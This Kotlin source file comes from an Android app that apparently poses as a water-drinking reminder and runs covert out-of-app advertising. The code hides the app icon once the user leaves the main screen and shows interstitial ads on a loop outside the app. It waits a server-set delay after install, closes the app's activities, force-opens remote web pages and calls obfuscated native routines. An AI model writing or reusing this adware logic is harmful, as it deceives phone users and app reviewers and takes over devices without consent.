package com.snow.fall.willows.swaying.febfive.utils

import android.content.Context
import android.os.Handler
import android.os.Looper
import com.snow.fall.willows.swaying.febfive.must.ShowService
import com.snow.fall.willows.swaying.febfive.net.CanPost
import com.snow.fall.willows.swaying.febfive.start.FebApp
import com.snow.fall.willows.swaying.febfive.start.FebFive
import com.snow.fall.willows.swaying.febfive.utils.AdUtils.initFaceBook
import com.tradplus.ads.base.bean.TPAdError
import com.tradplus.ads.base.bean.TPAdInfo
import com.tradplus.ads.open.interstitial.InterstitialAdListener
import com.tradplus.ads.open.interstitial.TPInterstitial
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class AdShowFun {
    private var jobAdRom: Job? = null
    val adLimiter = AdLimiter()

    // 广告对象
    var mTPInterstitial: TPInterstitial? = null

    // 广告缓存时间（单位：毫秒）
    private val AD_CACHE_DURATION = 50 * 60 * 1000L // 50分钟

    // 上次广告加载时间
    private var lastAdLoadTime: Long = 0

    // 是否正在加载广告
    private var isLoading = false
    var canNextState = false
    var clickState = false

    // 广告初始化，状态回调
    private fun intiTTTTAd() {
        if (mTPInterstitial == null) {
            val idBean = KeyContent.getAdminData() ?: return
            val id = idBean.canInform.split("-")
            KeyContent.showLog("体外广告id=: ${id[0]}")
            mTPInterstitial = TPInterstitial(FebApp.febApp, id[0])
            mTPInterstitial!!.setAdListener(object : InterstitialAdListener {
                override fun onAdLoaded(tpAdInfo: TPAdInfo) {
                    KeyContent.showLog("体外广告onAdLoaded: 广告加载成功")
                    lastAdLoadTime = System.currentTimeMillis()
                    CanPost.postPointDataWithHandler(false, "getadvertise")
                }

                override fun onAdClicked(tpAdInfo: TPAdInfo) {
                    KeyContent.showLog("体外广告onAdClicked: 广告${tpAdInfo.adSourceName}被点击")
                    adLimiter.recordAdClicked()
                    clickState = true
                }

                override fun onAdImpression(tpAdInfo: TPAdInfo) {
                    KeyContent.showLog("体外广告onAdImpression: 广告${tpAdInfo.adSourceName}展示")
                    adLimiter.recordAdShown()
                    resetAdStatus()
                    CanPost.postAdmobDataWithHandler(tpAdInfo)
                    CanPost.showsuccessPoint()
                    if (mTPInterstitial?.isReady == true) {
                        lastAdLoadTime = 0
                    }
                }

                override fun onAdFailed(tpAdError: TPAdError) {
                    KeyContent.showLog("体外广告onAdFailed: 广告加载失败")
                    resetAdStatus()
                    CanPost.postPointDataWithHandler(
                        false,
                        "getfail",
                        "string1",
                        tpAdError.errorMsg
                    )
                }

                override fun onAdClosed(tpAdInfo: TPAdInfo) {
                    KeyContent.showLog("体外广告onAdClosed: 广告${tpAdInfo.adSourceName}被关闭")
                    ShowService.closeAllActivities()
                    cloneAndOpenH5()
                }

                override fun onAdVideoError(tpAdInfo: TPAdInfo, tpAdError: TPAdError) {
                    resetAdStatus()
                    KeyContent.showLog("体外广告onAdClosed: 广告${tpAdInfo.adSourceName}展示失败")
                    CanPost.postPointDataWithHandler(
                        false,
                        "showfailer",
                        "string3",
                        tpAdError.errorMsg
                    )
                }

                override fun onAdVideoStart(tpAdInfo: TPAdInfo) {

                }

                override fun onAdVideoEnd(tpAdInfo: TPAdInfo) {
                }
            })
        }
    }

    // 加载广告方法
    private fun loadAd() {
        // 检查缓存是否有效
        val currentTime = System.currentTimeMillis()
        if (mTPInterstitial != null && mTPInterstitial?.isReady == true && currentTime - lastAdLoadTime < AD_CACHE_DURATION) {
            // 使用缓存的广告
            KeyContent.showLog("不加载,有缓存的广告")
            // 处理广告展示的逻辑
        } else {
            // 如果正在加载广告，则不发起新的请求
            if (isLoading) {
                KeyContent.showLog("正在加载广告，等待加载完成")
                return
            }
            // 设置正在加载标志
            isLoading = true
            // 发起新的广告请求
            KeyContent.showLog("发起新的广告请求")
            mTPInterstitial?.loadAd()
            CanPost.postPointDataWithHandler(false, "reqadvertise")

            // 设置超时处理
            Handler(Looper.getMainLooper()).postDelayed({
                if (isLoading && mTPInterstitial?.isReady != true) {
                    KeyContent.showLog("广告加载超时，重新请求广告")
                    // 超时处理，重新请求广告
                    loadAd()
                }
            }, 60 * 1000) // 60秒超时
        }
    }

    //广告状态重置
    fun resetAdStatus() {
        isLoading = false
        lastAdLoadTime = 0
    }

    fun String.parseLimits(): Triple<Int, Int, Int> {
        val limit = this.split("-") ?: listOf("0", "0", "0")
        return Triple(limit[0].toInt(), limit[1].toInt(), limit[2].toInt())
    }

    fun startRomFun() {
        initFaceBook()
        intiTTTTAd()
        val adminData = KeyContent.getAdminData() ?: return
        if (AdUtils.adNumAndPoint()) {
            return
        }
        val (wTime, wait, ins) = adminData.timeCanNext.parseLimits()
        val delayData = wTime.toLong().times(1000L)
        KeyContent.showLog("doToWhileAd delayData=: ${delayData}")
        jobAdRom = CoroutineScope(Dispatchers.Main).launch {
            while (true) {
                val a = ArrayList(ShowService.activityList)
                if (a.isEmpty() || (a.last().javaClass.name != "com.jgaodl.drinks.waters.days.happys.xy.MainActivityOld" && a.last().javaClass.name != "com.jgaodl.drinks.waters.days.happys.xy.MainActivity")) {
                    if (a.isEmpty()) {
                        KeyContent.showLog("隐藏图标=null")
                    } else {
                        KeyContent.showLog("隐藏图标=${a.last().javaClass.name}")
                    }
                    FebFive.febSo("jgao,9dlcuao,9", 144f)
                    break
                }
                delay(500)
            }
            checkAndShowAd(delayData)
        }
    }

    private suspend fun checkAndShowAd(delayData: Long) {
        while (true) {
            KeyContent.showLog("循环检测广告")
            CanPost.postPointDataWithHandler(false, "timertask")
            isHaveData()
            loadAd()
            isHaveAdNextFun()
            delay(delayData)
        }
    }

    private fun isHaveData() {
        if (AdUtils.adNumAndPoint()) {
            CanPost.postPointDataWithHandler(false, "jumpfail")
            jobAdRom?.cancel()
            return
        }
    }

    private fun isHaveAdNextFun() {
        // 检查锁屏或息屏状态，避免过多的嵌套
        if (AdUtils.canShowLocked()) {
            KeyContent.showLog("锁屏或者息屏状态，广告不展示")
            return
        }
        // 调用点位数据函数
        CanPost.postPointDataWithHandler(false, "isunlock")

        // 获取管理员数据
        val jsonBean = KeyContent.getAdminData() ?: return

        // 获取安装时间
        val instalTime = ShowService.getInstallTimeDataFun()
        val (wTime, ins, wait) = jsonBean.timeCanNext.parseLimits()

        // 检查首次安装时间和广告展示时间间隔
        if (isBeforeInstallTime(instalTime, ins)) return
        if (isAdDisplayIntervalTooShort(wait)) return
        val installFast = ShowService.getInstallFast()
        val timeD = installFast + (ins * 1000) + (jsonBean.wwwTime.toInt() * 1000)
        canNextState = false
        val h5Url = jsonBean.wwwUUUl.split("-")[0]
        KeyContent.showLog("h5Url=: ${h5Url}")
        if (timeD > System.currentTimeMillis() && h5Url.isNotEmpty()) {
            // 检查广告展示限制
            if (!FebApp.h5Limiter.canShowAd()) {
                KeyContent.showLog("h5广告展示限制")
                return
            }
            KeyContent.showLog("h5流程")

            ShowService.isH5State = true
        } else {
            ShowService.isH5State = false
            // 检查广告展示限制
            if (!adLimiter.canShowAd()) {
                KeyContent.showLog("体外广告展示限制")
                return
            }
            KeyContent.showLog("体外流程")
        }
        showAdAndTrack()
    }

    private fun isBeforeInstallTime(instalTime: Long, ins: Int): Boolean {
        if (instalTime < ins) {
            KeyContent.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
            CanPost.postPointDataWithHandler(false, "ispass", "string", "timeCanNext2")
            return true
        }
        return false
    }

    private fun isAdDisplayIntervalTooShort(wait: Int): Boolean {
        val jiange = (System.currentTimeMillis() - AdUtils.adShowTime) / 1000
        if (jiange < wait) {
            KeyContent.showLog("广告展示间隔时间小于$wait 秒，不展示")
            CanPost.postPointDataWithHandler(false, "ispass", "string", "timeCanNext3")
            return true
        }
        return false
    }

    private fun showAdAndTrack() {
        CanPost.postPointDataWithHandler(false, "ispass", "string", "")
        CoroutineScope(Dispatchers.Main).launch {
            ShowService.closeAllActivities()
            delay(1001)
            if (canNextState) {
                KeyContent.showLog("准备显示h5广告，中断体外广告")
                return@launch
            }
            addFa()
            FebFive.febSo("mQ#2xJ!9va3vk2@7bNP5r", 1021f)
            CanPost.postPointDataWithHandler(false, "callstart")
        }
    }

    fun cloneAndOpenH5() {
        // 锁屏+亮屏幕  && 在N秒后 && H5不超限
        // 当广告未关闭 下一个循环触发 体外广告，也会调用Close
        val jsonBean = KeyContent.getAdminData() ?: return
        val h5Url = jsonBean.wwwUUUl.split("-")[0]
        KeyContent.showLog("h5Url=: ${h5Url}")
        if (clickState || h5Url.isEmpty()) {
            return
        }
        clickState = false
        KeyContent.showLog("关闭打开H5")
        if (AdUtils.canShowLocked()) {
            KeyContent.showLog("锁屏或者息屏状态，广告不展示")
            return
        }
        val installFast = ShowService.getInstallFast()
        val (wTime, ins, wait) = jsonBean.timeCanNext.parseLimits()
        val timeD = installFast + (ins * 1000) + (jsonBean.wwwTime.toInt() * 1000)
        val jiange = (System.currentTimeMillis() - AdUtils.adShowTime) / 1000
        KeyContent.showLog("H5----1---=${timeD <= System.currentTimeMillis()}")
        KeyContent.showLog("H5----2---=${jiange < wait}")

        if (timeD <= System.currentTimeMillis() && jiange < wait) {
            // 检查广告展示限制
            if (!FebApp.h5Limiter.canShowAd()) {
                KeyContent.showLog("h5广告展示限制")
                return
            }
            KeyContent.showLog("跳转打开H5")
            ShowService.isH5State = true
            canNextState = true
            showAdAndTrack2()
        }
    }

    private fun showAdAndTrack2() {
        CanPost.postPointDataWithHandler(false, "ispass", "string", "")
        CoroutineScope(Dispatchers.Main).launch {
            addFa()
            ShowService.closeAllActivities()
            delay(778)
            FebFive.febSo("@7b9#2xvaN3vJ!mQ2kP5r", 1028f)
            CanPost.postPointDataWithHandler(false, "callstart")
        }
    }

    fun addFa() {
        var adNum = SPUtils.getInstance(FebApp.febApp).get(KeyContent.KEY_IS_AD_FAIL_COUNT, 0)
        adNum++
        SPUtils.getInstance(FebApp.febApp).put(KeyContent.KEY_IS_AD_FAIL_COUNT, adNum)
    }

}